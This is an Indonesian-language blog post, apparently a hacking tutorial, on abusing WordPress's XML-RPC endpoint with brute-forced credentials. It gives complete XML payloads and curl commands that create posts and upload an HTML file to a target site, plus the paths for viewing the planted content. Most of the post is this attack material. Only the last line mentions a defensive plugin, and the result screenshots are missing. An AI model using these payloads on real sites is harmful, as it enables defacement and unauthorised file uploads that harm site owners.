---
layout: post
title: "Exploiting XML-RPC API pada WordPress"
tags: tutorial, exploit, hacking
category: exploit
description: Vulnerability pada XML-RPC bukan hanya BruteForce saja...
comments: true
fullview: false
---
Vulnerability pada XMLRPC / tahap setelah BruteForce / alternatif jika gagal login ke /wp-admin/ (403/404/500)


1. Add Post (Menambahkan Postingan)
Menambahkan Postingan Baru Dengan POST XMLRPC:

Buka terminal linux (kali/ubuntu/termux/dll..)

Masukan command: nano addpost.xml

Lalu isikan dengan exploit berikut: 



<textarea style="background-color:black;color:lime;" rows="4" cols="40" readonly>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;methodCall&gt;
&lt;methodName&gt;wp.newPost&lt;/methodName&gt; &lt;params&gt;
        &lt;param&gt;&lt;value&gt;parameter&lt;/value&gt;&lt;/param&gt;
        &lt;param&gt;&lt;value&gt;vulnuser&lt;/value&gt;&lt;/param&gt;
        &lt;param&gt;&lt;value&gt;vulnuserpassword&lt;/value&gt;&lt;/param&gt;
        &lt;param&gt;&lt;struct&gt;
                &lt;member&gt;&lt;name&gt;post_title&lt;/name&gt;&lt;value&gt;Exploit To Add Post with XML-RPC&lt;/value&gt;&lt;/member&gt;
                &lt;member&gt;&lt;name&gt;post_content&lt;/name&gt;&lt;value&gt;Seems Like The Site Was Vulnerable!&lt;/value&gt;&lt;/member&gt;
                &lt;member&gt;&lt;name&gt;post_excerpt&lt;/name&gt;&lt;value&gt;excerpt&lt;/value&gt;&lt;/member&gt;
        &lt;/struct&gt;&lt;/param&gt; &lt;/params&gt;</textarea>
 Saatnya mengexploit!

Masukan command: 

curl http://vulnsite.com/xmlrpc.php --data @addpost.xml

Jika sukses akan tampil seperti ini:



Angka 6 adalah id postnya

Cara melihat postingannya dengan menambahkan ?p=idpostingan 

Contoh: http://vulnsite.com/?p=6



Post Sukses Dibuat.



 Add Media/File (Menambahkan Media/File)


Menambahkan Media atau File Baru Dengan POST XMLRPC:

Buka terminal linux (kali/ubuntu/termux/dll..)

Masukan command: nano addfile.xml

Lalu isikan dengan exploit berikut: 



<?xml version="1.0"?> <methodCall>

<methodName>metaWeblog.newMediaObject</methodName> <params>

        <param><value>parameter</value></param>

        <param><value>vulnuser</value></param>

        <param><value>vulnuserpassword</value></param>

        <param><struct>

                <member><name>name</name><value>touched.html</value></member>

                <member><name>type</name><value>text/plain</value></member>

                <member><name>bits</name><value>

                <![CDATA[<h1><center>File Uploaded Success<br/>XML-RPC add file exploit</center></h1>]]>

</value></member>

        </struct></param> </params>

</methodCall>



Exploit!

Masukan command: 

curl http://vulnsite.com/xmlrpc.php --data @addfile.xml

Jika sukses akan tampil seperti ini:



File sukses disimpan sesuai dengan nama yg telah ditentukan, di sini saya namakan filenya touched.html

Cara melihat hasil file yg tersimpan:

http://vulnsite.com/wp-content/uploads/2021(tahun saat upload)/05(bulan saat upload/namafile.html

Mari kita cek!:



File sukses terupload!



Cara mencegah exploit ini adalah dengan menginstall plugin bernama "Disable XML-RPC" lalu aktifkan, dan xmlrpc akan aman.



Sekian dari saya, semoga berguna dan bermanfaat!



